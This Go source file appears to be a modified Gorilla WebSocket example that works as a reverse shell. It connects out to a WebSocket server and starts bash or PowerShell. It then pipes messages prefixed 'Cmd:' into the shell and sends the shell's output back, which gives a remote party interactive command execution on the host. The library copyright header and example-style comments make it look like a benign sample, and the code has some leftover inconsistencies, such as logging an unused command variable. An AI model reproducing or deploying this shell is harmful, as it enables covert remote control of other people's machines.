// Copyright 2015 The Gorilla WebSocket Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

//go:build ignore
// +build ignore

package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

var addr = flag.String("addr", "localhost:8080", "http service address")
var cmdPath string
var commAnd = "bash"

const (
	// Time allowed to write a message to the peer.
	writeWait = 10 * time.Second
	// Maximum message size allowed from peer.
	maxMessageSize = 8192
	// Time allowed to read the next pong message from the peer.
	pongWait = 60 * time.Second
	// Send pings to peer with this period. Must be less than pongWait.
	pingPeriod = (pongWait * 9) / 10
	// Time to wait before force close on connection.
	closeGracePeriod = 10 * time.Second
)

func pumpStdin(ws *websocket.Conn, w io.Writer) {
	defer ws.Close()
	ws.SetReadLimit(maxMessageSize)
	ws.SetReadDeadline(time.Now().Add(pongWait))
	ws.SetPongHandler(func(string) error { ws.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			break
		}
		if !strings.HasPrefix(string(message), "\"Cmd:") {
			continue
		}
		// Using strconv.Unquote for escaped JSON strings
		// This is useful if the message is a JSON string that needs to be unquoted
		mess := string(message)
		unquoted, err := strconv.Unquote(mess)
		if err != nil {
			fmt.Println("Error unquoting:", err)
			return
		}
		unquoted = strings.TrimPrefix(unquoted, "Cmd: ")
		// fmt.Println("Error unquoting:", unquoted)
		lines := strings.Split(unquoted, "\n")
		var cmd string

		log.Printf("Executing command: %s", cmd)
		for _, line := range lines {
			if _, err := w.Write([]byte(line + "\n")); err != nil {
				break
			}
		}
	}
}

func pumpStdout(ws *websocket.Conn, r io.Reader, done chan struct{}) {
	defer func() {
	}()
	s := bufio.NewScanner(r)
	for s.Scan() {
		ws.SetWriteDeadline(time.Now().Add(writeWait))
		if err := ws.WriteMessage(websocket.TextMessage, s.Bytes()); err != nil {
			ws.Close()
			break
		}
	}
	if s.Err() != nil {
		log.Println("scan:", s.Err())
	}
	close(done)

	ws.SetWriteDeadline(time.Now().Add(writeWait))
	ws.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
	time.Sleep(closeGracePeriod)
	ws.Close()
}

func ping(ws *websocket.Conn, done chan struct{}) {
	ticker := time.NewTicker(pingPeriod)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			if err := ws.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(writeWait)); err != nil {
				log.Println("ping:", err)
			}
		case <-done:
			return
		}
	}
}

// func internalError(ws *websocket.Conn, msg string, err error) {
// 	log.Println(msg, err)
// 	ws.WriteMessage(websocket.TextMessage, []byte("Internal server error."))
// }

func main() {
	// flag.Parse()
	// log.SetFlags(0)

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)
	u := url.URL{Scheme: "ws", Host: *addr, Path: "/ws"}
	log.Printf("connecting to %s", u.String())
	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()
	done := make(chan struct{})
	// Path to the executable (using 'ls' on Unix or 'dir' on Windows)
	if os.Getenv("OS") == "Windows_NT" {
		commAnd = "powershell.exe"
	}
	cmdPath, err = exec.LookPath(commAnd)
	// Create a bash process
	cmd := exec.Command(commAnd)
	// Get pipes for stdin and stdout
	stdin, err := cmd.StdinPipe()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error creating stdin pipe: %v\n", err)
		return
	}
	defer stdin.Close()

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error creating stdout pipe: %v\n", err)
		return
	}
	// Start the command
	if err := cmd.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "Error starting command: %v\n", err)
		return
	}
	log.Printf("Command started: %s", cmdPath)
	go func() {
		defer close(done)
		for {
			// Read messages from the WebSocket connection.
			// _, message, err := c.ReadMessage()
			// if err != nil {
			// 	log.Println("read:", err)
			// 	return
			// }
			// log.Println("command:", message)
			stdoutDone := make(chan struct{})
			go pumpStdout(c, stdout, stdoutDone)
			// Start a goroutine to ping the server periodically.
			go ping(c, stdoutDone)
			pumpStdin(c, stdin)
			// Some commands will exit when stdin is closed.
			stdin.Close()
			// log.Printf("recv: %s", message)
		}
	}()

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		// case t := <-ticker.C:
		// 	err := c.WriteMessage(websocket.TextMessage, []byte(t.String()))
		// 	if err != nil {
		// 		log.Println("write:", err)
		// 		return
		// 	}
		case <-interrupt:
			log.Println("interrupt")
			// Cleanly close the connection by sending a close message and then
			// waiting (with timeout) for the server to close the connection.
			err := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Println("write close:", err)
				return
			}
			select {
			case <-done:
			case <-time.After(time.Second):
			}
			return
		}
	}
}
